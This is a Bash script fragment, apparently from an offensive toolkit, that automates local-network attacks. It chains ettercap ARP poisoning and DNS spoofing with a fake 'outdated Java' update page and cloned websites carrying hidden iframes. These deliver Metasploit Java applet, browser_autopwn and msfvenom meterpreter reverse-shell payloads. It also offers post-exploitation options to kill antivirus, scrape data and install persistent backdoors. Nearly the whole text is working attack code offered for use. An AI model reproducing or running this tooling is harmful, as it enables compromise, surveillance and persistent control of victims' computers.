# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "Post-auto.rc" --width 350 --height 250) > /dev/null 2>&1


   if [ "$pass" = "Default listenner" ]; then
     # starting a metasploit listenner
     echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - $fthost Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//

         # clean up script
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         mv $apache/$fthost $H0m3/opensource/priv8/$fthost > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1

           # 'shell_listenner.rc' file with msf settings will be stored under
           # '/opensource/priv8/' if we wish to start a listenner later...
           echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
           sleep 1
           cd $H0m3/opensource/priv8
           mkdir handler > /dev/null 2>&1
           cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$fthost" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

           echo "use exploit/multi/handler" > $resource-handler.rc
           echo "set PAYLOAD java/meterpreter/reverse_tcp" >> $resource-handler.rc
           echo "set LPORT $lport" >> $resource-handler.rc
           echo "set LHOST $lhost" >> $resource-handler.rc
           echo "set ExitOnSession false" >> $resource-handler.rc
           echo "exploit -j -z" >> $resource-handler.rc
           zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
         cd $H0m3/opensource
         clear




       elif [ "$pass" = "Post-auto.rc" ]; then
       # starting a metasploit listenner (post-auto.rc)
       echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
       echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
       echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
       sleep 2
       xterm -T "r00tsect0r - $fthost Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//

         # clean up script
         /etc/init.d/apache2 stop
         rm -r $tWd > /dev/null 2>&1
         rm $apache/index.html > /dev/null 2>&1
         rm $apache/jv0h.jpg > /dev/null 2>&1
         mv $apache/$fthost $H0m3/opensource/priv8/$fthost > /dev/null 2>&1
         rm $apache/softdown.png > /dev/null 2>&1
         rm $apache/metrics_group1.js > /dev/null 2>&1
         rm $apache/jv0_search_btn.gif > /dev/null 2>&1
         rm $apache/popUp.js > /dev/null 2>&1
         rm $apache/print.css > /dev/null 2>&1
         rm $apache/s_code_remote.js > /dev/null 2>&1
         rm $apache/screen.css > /dev/null 2>&1

           # 'shell_listenner.rc' file with msf settings will be stored under
           # '/opensource/priv8/' if we wish to start a listenner later...
           echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
           sleep 1
           cd $H0m3/opensource/priv8
           mkdir handler > /dev/null 2>&1
           cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$fthost" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

           echo "use exploit/multi/handler" > $resource-handler.rc
           echo "set PAYLOAD java/meterpreter/reverse_tcp" >> $resource-handler.rc
           echo "set LPORT $lport" >> $resource-handler.rc
           echo "set LHOST $lhost" >> $resource-handler.rc
           echo "set ExitOnSession false" >> $resource-handler.rc
           echo "exploit -j -z" >> $resource-handler.rc
           zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
         cd $H0m3/opensource
         clear


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean up script
     /etc/init.d/apache2 stop
     rm -r $tWd > /dev/null 2>&1
     rm $apache/index.html > /dev/null 2>&1
     rm $apache/jv0h.jpg > /dev/null 2>&1
     mv $apache/$fthost $H0m3/opensource/priv8/$fthost > /dev/null 2>&1
     rm $apache/softdown.png > /dev/null 2>&1
     rm $apache/metrics_group1.js > /dev/null 2>&1
     rm $apache/jv0_search_btn.gif > /dev/null 2>&1
     rm $apache/popUp.js > /dev/null 2>&1
     rm $apache/print.css > /dev/null 2>&1
     rm $apache/s_code_remote.js > /dev/null 2>&1
     rm $apache/screen.css > /dev/null 2>&1
     cd $H0m3/opensource
     clear
fi
}




sh_dirurl () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[Input payload settings]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
      fthost=$(zenity --title="NAME YOUR PAYLOAD" --text "\n example: java.jar\n" --entry --width 300) > /dev/null 2>&1
      echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
      read target

        # building index.htm with meta-tag injection
        cd $H0m3/opensource/priv8
        echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ index.html ]${Reset};
        sleep 1
        echo "<html><head></head><body>" > index.html
        echo "<center><img src="javaBanner.jpg" width="781" height="80"></img></center>" >> index.html
        echo "<title>outdated java plugin</title><br /><br />" >> index.html
        echo "<center><b>WARNING: YOUR VERSION OF JAVA ITS OUTDATED</b></center>" >> index.html
        echo "<center>Please wait redirecting to update...</center>" >> index.html
        echo "<link rel="shortcut icon" type="image/x-icon" a href="https://addons.cdn.mozilla.net/media/img/favicon.ico">" >> index.html
        echo "<meta http-equiv='refresh' content='5; url=http://$lhost:$lport'/>" >> index.html
        echo "</body></html>" >> index.html
        chown $user index.html

          # building payload
          echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $fthost ]${Reset};
          xterm -T "r00tsect0r - building $fthost" -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 -f java > $H0m3/opensource/priv8/$fthost"

cat << !

     Payload [jar] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $fthost
     STORAGE IN       : $apache/$fthost
     EXEC             : Drive-by URL payload execution
     PAYLOAD          : java/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Apple OSx, windows, Linux, BSD, Solaris

!
      sleep 2
      # copy files to apache and start apache2 webserver
      cp index.html $apache/index.html
      cp $fthost $apache/$fthost
      cp $H0m3/opensource/files/javaBanner.jpg $apache/javaBanner.jpg
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

    # setting dns_spoofing attack
    echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
    read op
    xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

# post exploitation module
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "Post-auto.rc" --width 350 --height 205) > /dev/null 2>&1

   if [ "$pass" = "Default listenner" ]; then
     # starting a metasploit listenner
     xterm -T "r00tsect0r - $fthost Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
       # clean up script
       /etc/init.d/apache2 stop
       rm $apache/index.html > /dev/null 2>&1
       rm $apache/javaBanner.jpg > /dev/null 2>&1
       rm $apache/$fthost > /dev/null 2>&1
       cd $H0m3/opensource
       clear

   elif [ "$pass" = "Post-auto.rc" ]; then
     # starting a metasploit listenner (post-auto.rc)
     xterm -T "r00tsect0r - $fthost Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
       # clean up script
       /etc/init.d/apache2 stop
       rm $apache/index.html > /dev/null 2>&1
       rm $apache/javaBanner.jpg > /dev/null 2>&1
       rm $apache/$fthost > /dev/null 2>&1
       cd $H0m3/opensource
       clear

   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean up script
     /etc/init.d/apache2 stop
     rm $apache/index.html > /dev/null 2>&1
     rm $apache/javaBanner.jpg > /dev/null 2>&1
     rm $apache/$fthost > /dev/null 2>&1
     cd $H0m3/opensource
     clear
fi
}












# -------------------------------
# clone a website and inject a metasploit iframe (dns+java_applet)
# -------------------------------
sh_dnsjava () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[Clonning WebSite target]${Reset};
      lhost=$(zenity --title "Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      target=$(zenity --title "CLONE WEBSITE [ url OR domain ]" --text "example: www.facebook.com" --entry --width 500) > /dev/null 2>&1
      uripath=$(zenity --title "Input URIPATH" --text "example: support" --entry --width 300) > /dev/null 2>&1
      appletname=$(zenity --title "Input APPLETNAME" --text "example: microsoft" --entry --width 300) > /dev/null 2>&1

            # input MITM config
            echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
            read router
            echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
            read victim

         # clean up script
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 2
         clear
         sh_dnsjava

else

      # dowloading/clonning website target
      mkdir $tWd
      cd $tWd
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ cloning website ]${Reset};
      mkdir $target
      cd $target
      # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
      wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php $target | zenity --progress --pulsate --title "JAVA_APPLET" --text="Cloning $target" --percentage=0 --auto-close --width 300 > /dev/null 2>&1


  # inject the iframe <TAG> in index.html using BASH SED command
  sed "s/<\/body>/<iframe SRC='http:\/\/$lhost:8080\/$uripath' height ='0' width ='0'><\/iframe><\/body>/g" index.html > copy.html
  mv copy.html index.html


# display current config settings to attacker
cat << !

     Payload [java_applet] Final Config:
     ===================================
     LHOST            : $lhost
     LPORT            : 8080
     CLONE            : $target
     APPLETNAME       : $appletname
     FILENAME         : index.html
     EXPLOIT          : multi/browser/java_signed_applet
     STORAGE IN       : $apache/index.html
                      : $apache/$target
     AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris

!


         # copy the folder to apache2 server
         cp index.html $apache/index.html
         cd ..
         cp -r $target $apache/$target
         cd $apache/
         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
         # chose target
         sh_chosetarget
fi
}

#
# MITM-DNS-SPOOFING-JAVA_APPLET ATTACK (2 step)
#
sh_chosetarget () {
Colors;


     # CHOSE WHAT PAYLOAD TO USE
     echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
     pass=$(zenity --list --title "AVAILABLE PAYLOADS" --text "chose one payload from the drop-list bellow" --radiolist --column "Pick" --column "Option" TRUE "java/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/ppc/shell/reverse_tcp" FALSE "osx/x86/vforkshell/reverse_tcp" --width 350 --height 260) > /dev/null 2>&1


      if [ "$pass" = "java/meterpreter/reverse_tcp" ]; then
      # starting a metasploit listenner (java payload)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 0; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

      elif [ "$pass" = "windows/meterpreter/reverse_tcp" ]; then
      # starting a metasploit listenner (windows x86)
      sh_startmeta


      elif [ "$pass" = "linux/x86/meterpreter/reverse_tcp" ]; then
      # starting a metasploit listenner (linux x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 2; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

      elif [ "$pass" = "osx/ppc/shell/reverse_tcp" ]; then
      # starting a metasploit listenner (mac osx PPC)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 3; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

      elif [ "$pass" = "osx/x86/vforkshell/reverse_tcp" ]; then
      # starting a metasploit listenner (mac osx x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 3; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

else

    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
    clear
fi
}


sh_startmeta () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; set AutoRunScript scraper; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33

      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     # persistence listenner
     sh_perlis3


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: dns-spoof-java_applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set APPLETNAME $appletname; set TARGET 1; set LHOST $lhost; set PAYLOAD $pass; set URIPATH /$uripath; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//
     sh_javaclear33


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
    clear
fi
}


sh_javaclear33 () {
Colors;


      # clean up script
      /etc/init.d/apache2 stop
      if [ -d $apache/$target ]; then
      rm -r $apache/$target
      echo ${RedF}[x]:[WAIT]:[ deleting old target from apache2 webroot ]${Reset};
      if [ -d $tWd ]; then
      rm -r $tWd
      echo ${RedF}[x]:[WAIT]:[ deleting old files from: $tWd ]${Reset};
      sleep 1
   fi
fi
}





sh_perlis3 () {
Colors;

      clear
      # chose to run  or not the persistence listenner
      echo ${BlueF}[*]${RedF}:${white} start 'persistence' listenner?${Reset};

cat << !

     Payload [persistence] Final Config:
     ===================================
     LHOST            : $lhost
     LPORT            : 8080
     PAYLOAD          : windows/meterpreter/reverse_tcp
     HANDLER          : $H0m3/opensource/priv8/handler/applet_pesistence.rc
     AFFECTED SYSTEMS : Windows OS

!

   # CHOSE OR NOT TO RUN PERSISTENCE LISTENNER
   QuE=$(zenity --question --title "PERSISTENCE LISTENNER" --text "\n   -:[ start 'persistence' listenner? ]:-" --width 350) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

     # START PERSISTENCE LISTENNER
     echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ starting 'persistence' listenner ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - 'persistence' payload listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 8080; exploit'"

       # QUIT AND BUILD RESOURCE FILE
       echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
       sleep 1
       cd $H0m3/opensource/priv8
       echo "use exploit/multi/handler" > applet_pesistence.rc
       echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> applet_pesistence.rc
       echo "set LPORT 8080" >> applet_pesistence.rc
       echo "set LHOST $lhost" >> applet_pesistence.rc
       echo "set ExitOnSession false" >> applet_pesistence.rc
       echo "exploit -j -z" >> applet_pesistence.rc
       zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r applet_pesistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
       clear
       sh_javaclear33

else

   Colors;
   echo ${RedF}[x]:[ QUITTING ]${Reset};
     # QUIT AND BUILD RESOURCE FILE
     echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
     sleep 1
     cd $H0m3/opensource/priv8
     echo "use exploit/multi/handler" > applet_pesistence.rc
     echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> applet_pesistence.rc
     echo "set LPORT 8080" >> applet_pesistence.rc
     echo "set LHOST $lhost" >> applet_pesistence.rc
     echo "set ExitOnSession false" >> applet_pesistence.rc
     echo "exploit -j -z" >> applet_pesistence.rc
     zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r applet_pesistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
     clear
     sh_javaclear33
fi
}













# -------------------------------
# clone a website and inject a metasploit iframe (browser_autopwn)
# -------------------------------
sh_clone () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[Clonning WebSite target]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      target=$(zenity --title="Clone website" --text "example: www.facebook.com" --entry --width 400) > /dev/null 2>&1
      uripath=$(zenity --title="Input URIPATH" --text "example: fotos" --entry --width 300) > /dev/null 2>&1

            # input MITM config
            echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
            read router
            echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
            read victim

         # clean up script
         if [ -d $tWd/$target ]; then
         rm -r $tWd/$target
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 2
         clear
         sh_clone

else

      # dowloading/clonning website target
      mkdir $tWd
      cd $tWd
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ cloning website ]${Reset};
      mkdir $target
      cd $target
      # download -U (user-agent) -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
      wget -qq -U Mozilla -p -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php $target | zenity --progress --pulsate --title "BROWSER_AUTO_PWN" --text="Cloning $target" --percentage=0 --auto-close --width 300 > /dev/null 2>&1


  # inject the iframe <TAG> in index.html using BASH SED command
  sed "s/<\/body>/<iframe SRC='http:\/\/$lhost:8080\/$uripath' height ='0' width ='0'><\/iframe><\/body>/g" index.html > copy.html
  mv copy.html index.html


# display current config settings to attacker
cat << !

     Payload [autopwn] Final Config:
     ===============================
     LHOST            : $lhost
     LPORT            : 8080
     CLONE            : $target
     FILENAME         : index.html
     EXPLOIT          : auxiliary/server/browser_autopwn
     STORAGE IN       : $apache/index.html
                      : $apache/$target
     AFFECTED SYSTEMS : Apple OSx, Linux, Windows, BSD, Solaris

!

         # copy the folder to apache2 server
         cp index.html $apache/index.html
         cd ..
         cp -r $target $apache/$target
         cd $apache/
         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

      # setting ARP poison attack
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
      xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      # start a listenner + ettercap mitm + dns_spoof
